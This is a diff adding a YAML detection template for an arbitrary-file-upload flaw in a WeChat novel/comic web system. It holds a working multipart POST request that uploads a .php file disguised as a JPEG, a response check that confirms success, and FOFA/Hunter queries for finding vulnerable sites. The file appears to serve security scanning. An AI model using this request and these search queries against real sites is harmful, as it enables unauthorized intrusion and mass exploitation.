@@ -1,0 +1,22 @@
+name: mh-fileupload       #微信公众号小说漫画系统
+rules: 
+  - method: POST               
+    headers:
+      Content-Type: multipart/form-data; boundary=6c17ff24eca
+    path: /Public/webuploader/0.1.5/server/fileupload.php
+    body: |
+      --6c17ff24eca
+      Content-Disposition: form-data; name="file"; filename="123.php"
+      Content-Type: image/jpeg
+      
+       123
+      --6c17ff24eca--                 
+    expression:                        
+      status_code:                  
+      response_header:              
+      response_body: jsonrpc       #响应包{"jsonrpc" : "2.0", "result" : null, "id" : "id"}              
+detail:                           
+  description: "微信公众号小说漫画系统fileupload.php接口存在任意文件上传,截至到2024.10.10存在该漏洞的网站较多。"
+  search:             
+    fofa: body="/Public/home/mhjs/jquery.js"
+    鹰图: web.body="/Public/home/mhjs/jquery.js"
